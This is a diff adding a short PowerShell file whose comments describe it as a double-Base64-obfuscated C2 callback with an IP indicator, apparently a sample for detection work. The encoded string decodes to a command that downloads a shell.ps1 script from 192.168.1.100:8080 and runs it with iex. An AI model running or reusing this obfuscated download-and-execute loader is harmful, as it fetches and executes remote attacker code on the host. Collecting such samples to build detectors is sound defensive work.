@@ -1,0 +1,7 @@
+# Double Base64 encoding hiding an IP-based C2 callback
+# Layer 1: Base64 -> Layer 2: Base64 -> PowerShell with IP IOC
+
+$stage2 = "U1c1MmIydGxMVVY0Y0hKbGMzTnBiMjRnS0U1bGR5MVBZbXBsWTNRZ1RtVjBMbGRsWWtOc2FXVnVkQ2t1Ukc5M2JteHZZV1JUZEhKcGJtY29JbWgwZEhBNkx5OHhPVEl1TVRZNExqRXVNVEF3T2pnd09EQXZjMmhsYkd3dWNITXhJaWs9"
+$stage1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stage2))
+$command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stage1))
+iex $command
